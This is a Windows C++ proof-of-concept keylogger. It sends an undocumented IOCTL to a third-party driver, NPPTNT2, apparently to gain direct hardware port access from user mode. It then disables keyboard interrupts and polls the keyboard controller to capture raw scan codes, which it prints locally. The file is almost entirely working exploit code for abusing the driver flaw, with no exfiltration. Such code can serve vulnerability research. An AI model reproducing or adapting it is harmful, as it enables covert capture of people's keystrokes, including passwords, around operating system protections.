// NPPTNT2keylog.cpp : Defines the entry point for the console application.
//


#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#include <stdio.h>
#include <tchar.h>

#include <windows.h>
#include <winioctl.h>
#include <conio.h>


int main(int argc, char* argv[])
{
        puts("Opening \\\\.\\NPPTNT2\r");
        HANDLE hFile = CreateFile("\\\\.\\NPPTNT2", 0, 0, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, 0);

        if (hFile != INVALID_HANDLE_VALUE)
        {
                puts("Calling DeviceIoControl\r");
                DWORD dwRet = 0;
                // Take this line out and the _inp will give you an AV
                DeviceIoControl(hFile, 0x958A2568, 0, 0, 0, 0, &dwRet, 0);

                // Read the status register
                int StatusRegister = _inp(0x64);

                printf("Status Register: %02X\n", StatusRegister);

                // Output the read command byte command
                _outp(0x64, 0x20);

                // Read the command bytes
                int CurrentCommandByte = _inp(0x60);

                printf("Current Command Byte: %02X\n", CurrentCommandByte);

                // Disable interrupts by masking off bit 0
                CurrentCommandByte &= 0xFE;

                // Output the write command byte command
                _outp(0x64, 0x60);

                // Output the new command byte
                _outp(0x60, CurrentCommandByte);

                puts("Type now and try 'E' or 'J' to exit, or Ctrl-C\r");

                // Run for hundred scan codes or less
                // (arbitrary termination condition)
                for (int i = 0 ; i < 100; i++)
                {
                        // Wait on bit 0 to go high
                        while ((_inp(0x64) & 0x01) == 0);

                        // Read the scan code from the keyboard
                        int nVal = _inp(0x60);

                        // Scan code 0x24 - Either 'E' or 'J' depending
                        // on which set of scan codes the keyboard is using
                        // Exit early on this key
                        if (nVal == 0x24)
                                break;

                        // list out the hex value of the scan code
                        printf("0x%02X ", nVal);
                }

                CloseHandle(hFile);
        }
        else
        {
                puts("Driver not found\r");
        }

        return 0;
}

